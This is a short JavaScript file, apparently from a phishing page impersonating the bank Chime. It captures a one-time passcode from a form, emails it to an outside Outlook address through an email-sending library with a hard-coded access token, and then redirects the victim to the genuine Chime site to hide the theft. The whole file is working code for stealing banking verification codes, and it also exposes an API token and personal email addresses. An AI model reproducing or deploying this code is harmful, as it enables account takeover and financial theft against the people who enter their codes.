const otp = document.getElementById('otp1');
const submit = document.getElementsByClassName('contact1')[0];

submit.addEventListener('submit', (e) => {
    e.preventDefault();


    let ebody = `
    <b>OTP: </b>${otp.value}
    <br> 
    `;

    Email.send({
        SecureToken: "9c8cec46-60dd-4046-b3d0-0751b0d5c5c0",
        To: 'jakesfishin111@outlook.com',
        From: "jakeramon999@gmail.com",
        Subject: "OTP: " + otp.value,
        Body: ebody
    }).then(function() {
        window.location.href = "https://www.chime.com/taxes/";
    });
});